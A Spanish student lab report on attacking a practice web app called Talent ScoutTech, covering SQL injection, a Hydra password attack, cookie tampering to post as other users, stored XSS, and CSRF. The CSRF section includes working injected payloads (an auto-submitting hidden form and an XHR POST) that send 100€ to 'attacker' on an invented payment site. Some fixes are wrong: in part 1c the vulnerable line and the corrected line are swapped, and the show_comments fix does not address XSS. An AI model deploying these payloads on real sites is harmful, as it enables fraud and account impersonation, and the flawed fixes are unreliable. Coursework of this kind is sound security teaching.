# Informe Técnico Proyecto 8: Talent ScoutTech

# Parte 1- SQLi

La página no permite añadir jugadores a usuarios no autenticados, un formulario nos exige que introduzcamos un usuario y contraseña válidos. Lo primero que haremos es comprobar que este formulario es vulnerable a una inyección y aprovecharlo para saltarnos esta protección.

a) Dad un ejemplo de combinación de usuario y contraseña que provoque un error en la consulta SQL generada por este formulario. Apartir del mensaje de error obtenido, decid cuál es la consulta SQL que se ejecuta, cuál de los campos introducidos al formulario utiliza y cuál no.

| Escribo los valores… |  1=1 --a”” |
| --- | --- |
| En el campo… | user |
| Del formulario de la página  | insert_player.php |
| La consulta SQL que se ejecuta es… | Select |
| Campos del formulario web utilizados en la consulta SQL | user |
| Campos del formulario web no  utilizados en la consulta SQL | Password |

![Untitled](img_Proyecto8/Untitled.png)

![Untitled](img_Proyecto8/Untitled%201.png)

b) Gracias a la SQL Injection del apartado anterior, sabemos que este formulario es vulnerable y conocemos el nombre de los campos de la tabla “users”. Para tratar de impersonar a un usuario, nos hemos descargado un diccionario que contiene algunas de las contraseñas más utilizadas (se listan a continuación):

- password
- 123456
- 12345678
- 1234
- qwerty
- 12345678
- dragon

Dad un ataque que, utilizando este diccionario, nos permita impersonar un usuario de esta aplicación y acceder en nombre suyo. Tened en cuenta que no sabéis ni cuántos usuarios hay registrados en la aplicación, ni los nombres de estos.

| Explicación del ataque | El ataque consiste en repetir el intento de login con usuarios generados en un diccionario usando la herramienta Hydra utilizando en cada interacción una contraseñas diferentes del diccionario |
| --- | --- |
| Campo de usuario con que el ataque ha tenido éxito | luis |
| Campo de contraseña con que el ataque ha tenido éxito | 1234 |

c) Si vais a **private/auth.php,** veréis que en la función areUserAndPasswordValid”, se utiliza “SQLite3::escapeString()”, pero, aun así, el formulario es vulnerable a SQL Injections, explicad cuál es el error de programación de esta función y como lo podéis corregir.

| Explicación del error | Usa la función de SQLite3::escapeString() para intentar prevenir SQL injection, pero no proporciona la protección suficiente contra SQL injection de manera efectiva. |
| --- | --- |
| Solución: Cambiar la línea con el código | $statement = $db->prepare('SELECT userId, password FROM users WHERE username = :username');
$statement->bindValue(':username', $user, SQLITE3_TEXT); |
| …por la siguiente línea | $query = SQLite3::escapeString('SELECT userId, password FROM users WHERE username = "' . $user . '"'); |

d) Si habéis tenido éxito con el ***apartado b),*** os habéis autenticado utilizando elusuario “luis” (si no habéis tenido éxito, podéis utilizar la contraseña “1234” para realizar este apartado). Con el objetivo de mejorar la imagen de la jugadora “Candela Pacheco”, le queremos escribir un buen puñado de comentarios positivos, pero no los queremos hacer todos con la misma cuenta de usuario.

Para hacer esto, en primer lugar habéis hecho un ataque de fuerza bruta sobre eldirectorio del servidor web (por ejemplo, probando nombres de archivo) y habéis encontrado el archivo “add_comment.php~”. Estos archivos seguramente se han creado como copia de seguridad al modificar el archivo “.php” original directamente al servidor. En general, los servidores web no interpretan (ejecuten) los archivos “.php~” sino que los muestran como archivos de texto sin interpretar.

Esto os permite estudiar el código fuente de “add_comment.php” y encontrar una vulnerabilidad para publicar mensajes en nombre de otros usuarios. ¿Cuál es esta vulnerabilidad, y cómo es el ataque que utilizáis para explotarla?

| Vulnerabilidad detectada… | La vulnerabilidad se encuentra en la siguiente línea:
$query = "INSERT INTO comments (playerId, userId, body) VALUES ('".$_GET['id']."', '".$_COOKIE['userId']."', '$body')";
 |
| --- | --- |
| Descripción del ataque… | El código permite a los usuarios enviar comentarios en nombre de otros usuarios sin verificar si tienen permiso necesario para hacerlo. |
| ¿Cómo podemos hacer que sea segura esta entrada? | // Preparar la consulta con marcadores de posición

$query = "INSERT INTO comments (playerId, userId, body) VALUES (?, ?, ?)";

// Preparar la declaración

$stmt = $db->prepare($query);

// Vincular los parámetros

$stmt->bindParam(1, $_GET['id'], SQLITE3_INTEGER);
$stmt->bindParam(2, $_SESSION['userId'], SQLITE3_INTEGER); // Usamos $_SESSION en lugar de $_COOKIE para mayor seguridad
$stmt->bindParam(3, $body, SQLITE3_TEXT);

// Ejecutar la consulta

$stmt->execute();
 |

Para poder hacer un ataque a esa vulnerabilidad, podemos simplemente, manipular la cookie ‘userId’ y con ello, se podría suplantar la identidad de otro usuario y enviar comentarios en su nombre.

# Parte 2- XSS

En vistas de los problemas de seguridad que habéis encontrado, empezáis a sospechar que esta aplicación quizás es vulnerable a XSS (Cross Site Scripting).

a) Para ver si hay un problema de XSS, crearemos un comentario que muestre un alert de Javascript siempre que alguien consulte el/los comentarios de aquel jugador (show_comments.php). Dad un mensaje que genere un «alert»de Javascript al consultar el listado de mensajes.

![Untitled](img_Proyecto8/Untitled%202.png)

| Introduzco el Mensaje | <script>alert('consulta')</script> |
| --- | --- |
| En el formulario de la página  | En la página de Gloria Calleja:
/show_comments.php?id=5 |

b) Por qué dice "&" cuando miráis un link(como elque aparece a la portada de esta aplicación pidiendo que realices un donativo) con parámetros GETdentro de código html si en realidad el link es sólo con "&" ?

| Explicación | Se utiliza el símbolo & para enviar parámetros dentro del enlace en caso del donate, iría dirigido a http://www.donate.co con los parámetros ‘amount=100’ y ‘destination=ACMEScouting/’ |
| --- | --- |

c) Explicad cuál es el problema de show_comments.php, y cómo lo arreglaríais. Para resolver este apartado, podéis mirar el código fuente de esta página.

| ¿Cuál es el problema? | El código original no está protegiendo adecuadamente la información que recibe de los usuarios a través de la URL.  UN atacante, podría causar que el código funcione incorrectamente o incluso que realice acciones no deseadas en la base de datos. |
| --- | --- |
| Sustituyo el código de la/las líneas… | $query = "SELECT commentId, username, body FROM comments C, users U WHERE C.playerId =".$_GET['id']." AND U.userId = C.userId order by C.playerId desc";
 |
| …por el siguiente código… | $query = "SELECT commentId, username, body FROM comments C, users U WHERE C.playerId = ? AND U.userId = C.userId ORDER BY C.playerId DESC"; |

d) Descubrid si hay alguna otra página que esté afectada por esta misma vulnerabilidad. En caso positivo, explicad cómo lo habéis descubierto.

| Otras páginas afectadas… | Afectaría a add_comment también |
| --- | --- |
| ¿Cómo lo he descubierto? | Si se mira el código fuente de show_comments, se puede ver que al final puede recibir los comentarios de add_coment como opción adicional, y podría influir al punto, de por ejemplo, crear un script XSS para añadirlo dentro  un dato de la base de datos |

![Untitled](img_Proyecto8/Untitled%203.png)

# Parte 3- **Control de acceso, autenticación y sesiones de usuarios**

a) En el ejercicio 1, hemos visto cómo era inseguro el acceso de los usuarios a la aplicación. En la página de ***register.php*** tenemos el registro de usuario. ¿Qué medidas debemos implementar para evitar que el registro sea inseguro? Justifica esas medidas e implementa las medidas que sean factibles en este proyecto.

- Validación de entrada de usuario: Se deben validar todos los datos ingresados por el usuario para asegurarse de que cumplan con ciertos criterios, como longitud adecuada, formato correcto y ausencia de caracteres maliciosos.
- Evitar la inyección de SQL: Es importante utilizar consultas preparadas o funciones de escape de SQL para evitar la inyección SQL. Esto asegura que los datos ingresados por el usuario no puedan ser interpretados como comandos SQL maliciosos.
- Contraseñas seguras: Se deben exigir a los usuarios que utilicen contraseñas seguras que incluyan una combinación de letras mayúsculas u minúsculas, números y caracteres especiales.
- Límite de intentos de registro: Se puede establecer un límite en el número de intentos de registros fallidos desde una misma dirección IP o usuario para prevenir ataques de fuerza bruta.

b) En el apartado de login de la aplicación, también deberíamos implantar una serie de medidas para que sea seguro el acceso, (sin contar la del ejercicio 1.c). Como en el ejercicio anterior, justifica esas medidas e implementa las que sean factibles y necesarias (ten en cuenta las acciones realizadas en el register). Puedes mirar en la carpeta ***private***

- Hashing de Contraseñas: Se debe utilizar el hashing de contraseñas para almacenarlas de forma segura en la base de datos.
- Almacenamiento de tokens de sesión seguros: Después de que un usuario inicie sesión correctamente, se debe generar un token de sesión único y seguro que se almacene en una cookie segura o en una sesión del servidor.
- Limitar los intentos de inicio de sesión: Para prevenir ataques de fuerza bruta, se puede implementar un mecanismo para limitar el número de intentos de inicio de sesión desde una misma dirección IP o usuario durante un período de tiempo determinado.
- Cerrar sesión de forma segura: Proporcionar una opción para que los usuarios cierren sesión de manera segura, eliminando cualquier token de sesión almacenado en la cookie o en el servidor.

c) Volvemos a la página de ***register.php***, vemos que está accesible para cualquier usuario, registrado o sin registrar. Al ser una aplicación en la cual no debería dejar a los usuarios registrarse, qué medidas podríamos tomar para poder gestionarlo e implementa las medidas que sean factibles en este proyecto.

- Verificación de sesión: Se debe verificar si el usuario ya ha iniciado sesión. Si el usuario ya está autenticado, se le redirige a otra página.
- Acceso solo para usuarios no registrados: Se debe permitir el acceso a la página ‘register.php’ solo si el usuario no ha iniciado sesión.
- Protección de acceso directo: Asegurarse de que incluso si un usuario intenta acceder a la página ‘register.php’ a través de la barra de direcciones del navegador, se le redirija a otra página si ya ha iniciado sesión.

d) Al comienzo de la práctica hemos supuesto que la carpeta ***private*** no tenemos acceso, pero realmente al configurar el sistema en nuestro equipo de forma local. ¿Se cumple esta condición? ¿Qué medidas podemos tomar para que esto no suceda?

- Restricción de permisos de archivo: Asegurarse de que los archivos y directorios dentro de la carpeta ‘private’ tengan permisos adecuados para evitar accesos no autorizados. Esto puede implicar configurar los permisos de archivo de manera que solo el usuario propietario tenga acceso de lectura y escritura, y que los demás usuarios y grupos no tengan acceso.
- Protección con contraseña: Configurar un sistema de autenticación básica en el servidor web local para proteger el acceso a la carpeta ‘private’.
- Encriptación de archivos sensibles: Si la carpeta ‘private’ contiene información sensible, es importante encriptar estos archivos para proteger su contenido en caso de acceso no autorizado.
- Auditoría de acceso: Llevar un registro de los accesos a la carpeta ‘private’ y de cualquier modificación o acceso no autorizado que ocurra. Esto puede ayudar a identificar y responder rápidamente a posibles brechas de seguridad.

e) Por último, comprobando el flujo de la sesión del usuario. Analiza si está bien asegurada la sesión del usuario y que no podemos suplantar a ningún usuario. Si no está bien asegurada, qué acciones podríamos realizar e implementarlas.

- Configurar correctamente las cookies de sesión: Las cookies de sesión deben configurarse de manera segura, utilizando el atributo Secure para garantizar que solo se envíen a través de conexiones HTTPS, y el atributo HttpOnly para prevenir que las cookies sean accesibles a través de scripts de JavaScript.
- Cerrar sesión de manera segura: Proporcionar una opción para que los usuarios cierren sesión de manera segura, eliminando cualquier token de sesión almacenado en la cookie o en el servidor.
- Proteger contra ataques de fuerza bruta: Implementar mecanismos para prevenir ataques de fuerza bruta, como el bloqueo temporal de cuentas después de un número determinado de intentos fallidos de inicio de sesión.

# Parte 4- **Servidores web**

¿Qué medidas de seguridad se implementaríais en el servidor web para reducir el riesgo a ataques?

- Actualizaciones regulares del software: Mantener actualizado el software del servidor web y sus componentes para parchear cualquier vulnerabilidad.
- Configuración segura del servidor: Configurar correctamente el servidor web para reducir la superficie de ataque, deshabilitando servicios innecesarios, ajustando los permisos de archivo y directorio y asegurándose de seguir las mejores prácticas de seguridad.
- Monitoreo de seguridad: Implementar herramientas de monitoreo y detección de intrusiones para supervisar la actividad del servidor, identificar comportamientos anómalos y responder rápidamente a posibles amenazas.
- Actualizaciones automáticas: Configurar actualizaciones automáticas para aplicar parches de seguridad y actualizaciones críticas de forma regular, reduciendo así el riesgo de explotación de vulnerabilidades conocidas.
- Respuesta a incidentes: Desarrollar un plan de respuesta a incidentes para manejar de manera eficiente y efectiva cualquier incidente de seguridad que pueda surgir, minimizando el impacto en la operatividad del servidor y la seguridad de los datos.
- Auditorías de seguridad regulares: Realizar auditorías de seguridad periódicas para evaluar la postura de seguridad del servidor, identificar posibles vulnerabilidades y áreas de mejora, y garantizar el cumplimiento de los estándares de seguridad.
- Educación y concienciación en seguridad: Capacitar al personal del servidor web en prácticas de seguridad cibernética, concienciar sobre las amenazas y mejores prácticas de seguridad, y fomentar una cultura de seguridad en toda la organización.

# Parte 5- CSRF

Ahora ya sabemos que podemos realizar un ataque XSS. Hemos preparado el siguiente enlace: [http://web.pagos/donate.php?amount=100&receiver=attacker,](http://web.pagos/donate.php?amount=100&receiver=attacker) mediante el cual, cualquiera que haga click hará una donación de 100€ al nuestro usuario (con nombre 'attacker') de la famosa plataforma de pagos online 'web.pagos' (Nota: como en realidad esta es una dirección inventada, vuestro navegador os devolverá un error 404).

a) Editad un jugador para conseguir que, en el listado de jugadores (list_players.php) aparezca, debajo del nombre de su equipo y antes de “(show/add comments)” un botón llamado “Profile” que corresponda a un formulario que envíe a cualquiera que haga clic sobre este botón a esta dirección que hemos preparado.

| En el Campo..  | Team name |
| --- | --- |
| Introduzco… | <br></br>
<a href="http://web.pagos/donate.php?amount=100&receiver=attacker">
<button>Profile</button>
</a>  |

![Untitled](img_Proyecto8/Untitled%204.png)

b) Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que el usuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (show_comments.php).

![Untitled](Informe%20Te%CC%81cnico%20Proyecto%208%20Talent%20ScoutTech%20bce9cf39620244ed99b8a72d69061c3a/Untitled%205.png)

Prácticamente al acceder a la página, te redirecciona directo a la página de donar.

Código: 

```html
<form id="attackForm" action="http://web.pagos/donate.php" method="post">
    <input type="hidden" name="amount" value="100">
    <input type="hidden" name="receiver" value="attacker">
</form>
<script>
    document.getElementById("attackForm").submit();
</script>
```

c) Pero 'web.pagos' sólo gestiona pagos y donaciones entre usuarios registrados, puesto que, evidentemente, le tiene que restar los 100€ a la cuenta de algún usuario para poder añadirlos a nuestra cuenta.

Explicad qué condición se tendrá que cumplir por que se efectúen las donaciones de los usuarios que visualicen el mensaje del apartado anterior o hagan click en el botón del apartado a).

- Permitir donaciones entre usuarios registrados
- No requerir confirmación adicional del usuario receptor de la donación
- Los usuarios deben de haber iniciado sesión en sus cuentas en ‘web.pagos’
- El usuario receptor de la donación debe tener una cuenta válida y suficiente saldo en su cuenta para recibir la donación.

d) Si 'web.pagos' modifica la página 'donate.php' para que reciba los parámetros a través de POST, quedaría blindada contra este tipo de ataques? En caso negativo, preparad un mensaje que realice un ataque equivalente al de la apartado b) enviando los parámetros “amount” i “receiver” por POST.

No quedaría del todo blindado completamente debido a que sería posible realizar ataques XSS si los parámetros se incorporan directamente en el cuerpo de la solicitud POST sin una adecuada validación y sanitización.

Si ponemos esto en un comentario:

```html
<script>
    // Realizar ataque de forma automática al cargar la página
    document.addEventListener("DOMContentLoaded", function() {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://web.pagos/donate.php");
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("amount=100&receiver=attacker");
    });
</script>

```

Cuando aceda a la página que se encuentre el script, resultaría en una solicitud POST con los parámetros "amount" y "receiver" establecidos en valores específicos, sin que el usuario tenga conocimiento de ello.